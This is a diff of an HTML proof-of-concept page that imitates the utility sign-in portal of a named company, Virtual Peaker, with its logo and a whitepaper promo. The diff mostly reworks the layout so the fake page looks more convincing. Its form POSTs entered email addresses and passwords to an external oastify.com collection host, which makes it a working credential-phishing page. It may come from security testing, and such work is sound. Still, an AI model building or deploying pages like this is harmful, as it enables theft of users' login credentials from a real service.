@@ -6,15 +6,26 @@
   <title>Utility Sign In | Virtual Peaker (PoC)</title>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@300;400;600&display=swap">
   <style>
+    * { box-sizing: border-box; }
     body {
       margin: 0;
-      padding: 0;
-      background: #eaeff5;
       font-family: 'Mulish', sans-serif;
       display: flex;
-      justify-content: center;
-      align-items: center;
       height: 100vh;
+    }
+    .left {
+      width: 50%;
+      background: #193b6d;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+    }
+    .left img {
+      max-width: 180px;
+      margin-bottom: 20px;
     }
     .login-box {
       background: white;
@@ -23,7 +34,6 @@
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
       width: 100%;
       max-width: 400px;
-      border-top: 10px solid #193b6d;
     }
     h2 {
       text-align: center;
@@ -90,25 +100,69 @@
       text-align: center;
       margin-top: 15px;
     }
+    .right {
+      width: 50%;
+      background: url('https://virtual-peaker.com/wp-content/uploads/2023/05/network-bg.jpg') no-repeat center center;
+      background-size: cover;
+      color: white;
+      padding: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    .right .content {
+      max-width: 360px;
+      background: rgba(0,0,0,0.5);
+      padding: 20px;
+      border-radius: 8px;
+    }
+    .right h3 {
+      margin: 0 0 10px;
+      font-size: 18px;
+    }
+    .right p {
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+    .right a {
+      background: #f28c28;
+      color: white;
+      padding: 8px 16px;
+      text-decoration: none;
+      border-radius: 4px;
+      font-weight: bold;
+      font-size: 13px;
+    }
   </style>
 </head>
 <body>
-  <div class="login-box">
-    <h2>Utility Sign In</h2>
-    <div class="tabs">
-      <div class="active">Use Password</div>
-      <div>Use Secure Link</div>
+  <div class="left">
+    <img src="https://utility.virtualpeaker.io/assets/app-icons/favicon-196x196.png" alt="Virtual Peaker logo">
+    <div class="login-box">
+      <h2>Utility Sign In</h2>
+      <div class="tabs">
+        <div class="active">Use Password</div>
+        <div>Use Secure Link</div>
+      </div>
+      <form method="POST" action="http://r1t2f5ndv073o0m763p89qjpsgy7mzao.oastify.com">
+        <label for="username">Email Address</label>
+        <input type="email" id="username" name="username" placeholder="Enter your email address" required>
+
+        <label for="password">Password <span class="forgot"><a href="#">Forgot password?</a></span></label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+        <button type="submit">SIGN IN</button>
+      </form>
+      <div class="note">This is a PoC. Credentials are sent to a testing endpoint.</div>
     </div>
-    <form method="POST" action="http://r1t2f5ndv073o0m763p89qjpsgy7mzao.oastify.com">
-      <label for="username">Email Address</label>
-      <input type="email" id="username" name="username" placeholder="Enter your email address" required>
-
-      <label for="password">Password <span class="forgot"><a href="#">Forgot password?</a></span></label>
-      <input type="password" id="password" name="password" placeholder="Enter your password" required>
-
-      <button type="submit">SIGN IN</button>
-    </form>
-    <div class="note">This is a PoC. Credentials are sent to a testing endpoint.</div>
+  </div>
+  <div class="right">
+    <div class="content">
+      <h3>Whitepaper</h3>
+      <p>The Next-Gen Virtual Power Plant is Here: Unlocking the Full Potential of Distributed Energy Resources with Topline Demand Control</p>
+      <a href="#">Download Whitepaper</a>
+    </div>
   </div>
 </body>
 </html>
